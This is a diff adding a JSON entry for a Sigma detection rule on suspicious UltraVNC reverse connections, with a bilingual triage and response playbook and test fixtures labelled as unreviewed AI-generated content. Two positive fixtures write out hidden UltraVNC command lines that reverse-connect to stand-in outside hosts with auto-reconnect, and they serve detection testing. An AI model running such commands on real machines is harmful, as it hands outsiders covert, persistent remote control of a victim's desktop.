@@ -1,0 +1,131 @@
+{
+  "rule": {
+    "id": "871b9555-69ca-4993-99d3-35a59f9f3599",
+    "title": "Suspicious UltraVNC Execution",
+    "level": "high",
+    "status": "test",
+    "author": "Bhabesh Raj",
+    "path": "windows/process_creation/proc_creation_win_ultravnc_susp_execution.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_ultravnc_susp_execution.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1021.005"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó un proceso cuyo CommandLine combina los parámetros de UltraVNC -autoreconnect, -connect y -id:. Esto indica una conexión VNC inversa hacia un host remoto que se restablece sola, un patrón que la regla asocia con el grupo Gamaredon.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuyo CommandLine contiene a la vez '-autoreconnect ', '-connect ' y '-id:'. Con esta combinación, UltraVNC inicia una conexión saliente hacia un viewer o repeater con un ID determinado y la retoma automáticamente cuando se corta.",
+      "why_it_matters": "Una sesión VNC inversa le da al atacante control remoto interactivo del escritorio y le permite moverse lateralmente (ATT&CK T1021.005, Remote Services: VNC). Además, la reconexión automática hace que el acceso persista aunque se interrumpa la red.",
+      "triage_steps": [
+        "Revise Image y OriginalFileName: ¿es UltraVNC (winvnc/vncviewer) instalado en Program Files o un binario renombrado en AppData, Temp o ProgramData?",
+        "Extraiga del CommandLine el destino de -connect (IP o dominio y puerto) y el valor de -id:. Verifique si el destino es un repeater corporativo conocido.",
+        "Revise ParentImage y la cadena de procesos padre: wscript, cscript, mshta, cmd lanzado desde un adjunto o una tarea programada son señales de alerta.",
+        "Busque en el mismo host, en una ventana de +/- 15 minutos, archivos SFX/7z descomprimidos, scripts VBS y nuevas claves Run o tareas programadas.",
+        "Consulte la telemetría de red para ver conexiones salientes al destino de -connect y si otros endpoints contactan esa misma IP o dominio.",
+        "Calcule el hash del binario, compárelo con la versión oficial de UltraVNC y búsquelo en el resto de la flota.",
+        "Revise alertas anteriores del mismo usuario y del mismo host, sobre todo de phishing o de ejecución de scripts."
+      ],
+      "false_positives": [
+        "Soporte remoto legítimo con UltraVNC SingleClick o repeater, donde la mesa de ayuda configura -id: y -autoreconnect hacia un repeater corporativo documentado.",
+        "Herramientas de administración o de MSP que empaquetan UltraVNC con conexión inversa automática para dar soporte a equipos fuera de la red."
+      ],
+      "response_steps": [
+        "Confirme con la mesa de ayuda o el MSP si existe una sesión de soporte autorizada hacia ese destino y con ese ID.",
+        "Si no está autorizada, aísle el endpoint y bloquee el destino de -connect en el firewall o el proxy.",
+        "Termine el proceso, conserve el binario y los scripts como evidencia, y elimine los mecanismos de persistencia (Run, tareas, carpeta Startup).",
+        "Restablezca las credenciales del usuario afectado y busque el mismo hash y la misma línea de comandos en otros hosts.",
+        "Restaure el equipo desde una imagen confiable si confirma que fue comprometido, y documente los IOC."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque esta combinación de parámetros otorga control remoto persistente hacia un destino externo y casi no aparece en un uso administrativo normal."
+    },
+    "en": {
+      "summary": "A process started with a CommandLine that combines the UltraVNC flags -autoreconnect, -connect and -id:. This means a self-restoring reverse VNC connection to a remote host, a pattern the rule links to the Gamaredon group.",
+      "what_it_detects": "Windows process creation events whose CommandLine contains all of '-autoreconnect ', '-connect ' and '-id:'. With these flags UltraVNC opens an outbound connection to a viewer or repeater using a given ID and restores it automatically when it drops.",
+      "why_it_matters": "A reverse VNC session gives an attacker interactive remote control of the desktop and lets them move laterally (ATT&CK T1021.005, Remote Services: VNC). Auto-reconnect keeps that access alive through network interruptions.",
+      "triage_steps": [
+        "Check Image and OriginalFileName: is this UltraVNC (winvnc/vncviewer) installed in Program Files, or a renamed binary in AppData, Temp or ProgramData?",
+        "Extract the -connect target (IP or domain and port) and the -id: value from CommandLine. Check whether the target is a known corporate repeater.",
+        "Review ParentImage and the process ancestry. wscript, cscript, mshta, or cmd started from an email attachment or a scheduled task are red flags.",
+        "On the same host within +/- 15 minutes, look for extracted SFX/7z archives, VBS scripts and new Run keys or scheduled tasks.",
+        "Check network telemetry for outbound connections to the -connect target and for other endpoints contacting the same IP or domain.",
+        "Hash the binary, compare it with the official UltraVNC release and hunt for the hash across the fleet.",
+        "Review earlier alerts for the same user and host, especially phishing or script execution alerts."
+      ],
+      "false_positives": [
+        "Legitimate remote support with UltraVNC SingleClick or a repeater, where the helpdesk sets -id: and -autoreconnect toward a documented corporate repeater.",
+        "MSP or admin tooling that bundles UltraVNC with automatic reverse connections to support off-network machines."
+      ],
+      "response_steps": [
+        "Confirm with the helpdesk or MSP whether an authorized support session exists for that target and ID.",
+        "If it is not authorized, isolate the endpoint and block the -connect target at the firewall or proxy.",
+        "Kill the process, keep the binary and scripts as evidence, and remove persistence (Run keys, tasks, Startup folder).",
+        "Reset the user's credentials and hunt for the same hash and command line on other hosts.",
+        "Reimage the machine from a trusted image if compromise is confirmed, and record the IOCs."
+      ],
+      "severity_rationale": "High fits because this flag combination grants persistent remote control to an external destination and is rare in normal administration."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Renamed UltraVNC server in AppData, launched by wscript, reverse-connecting with auto-reconnect and an ID",
+        "event": {
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Users\\jperez\\AppData\\Roaming\\Microsoft\\Windows\\wmsvc.exe",
+          "OriginalFileName": "WinVNC.exe",
+          "CommandLine": "\"C:\\Users\\jperez\\AppData\\Roaming\\Microsoft\\Windows\\wmsvc.exe\" -autoreconnect -id:4821 -connect 203.0.113.45:5612",
+          "ParentImage": "C:\\Windows\\System32\\wscript.exe",
+          "ParentCommandLine": "\"C:\\Windows\\System32\\wscript.exe\" C:\\Users\\jperez\\AppData\\Local\\Temp\\upd.vbs",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "UltraVNC started from a Run key at logon with mixed-case flags and a domain target",
+        "event": {
+          "Computer": "WS-0217.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\ProgramData\\Video\\winvnc.exe",
+          "OriginalFileName": "WinVNC.exe",
+          "CommandLine": "C:\\ProgramData\\Video\\winvnc.exe -AutoReconnect -ID:77310 -Connect relay.example.org:443 -run",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Helpdesk technician running UltraVNC viewer to a direct connection without auto-reconnect or ID",
+        "event": {
+          "Computer": "IT-SUP-03.andes.example.com",
+          "User": "ANDES\\soporte01",
+          "Image": "C:\\Program Files\\uvnc bvba\\UltraVNC\\vncviewer.exe",
+          "OriginalFileName": "vncviewer.exe",
+          "CommandLine": "\"C:\\Program Files\\uvnc bvba\\UltraVNC\\vncviewer.exe\" -connect 198.51.100.20:5900 -quickoption 3",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "UltraVNC server started as a service listening normally, with no reverse-connect flags",
+        "event": {
+          "Computer": "SRV-APP-01.andes.example.com",
+          "User": "NT AUTHORITY\\SYSTEM",
+          "Image": "C:\\Program Files\\uvnc bvba\\UltraVNC\\winvnc.exe",
+          "OriginalFileName": "WinVNC.exe",
+          "CommandLine": "\"C:\\Program Files\\uvnc bvba\\UltraVNC\\winvnc.exe\" -service",
+          "ParentImage": "C:\\Windows\\System32\\services.exe",
+          "IntegrityLevel": "System"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
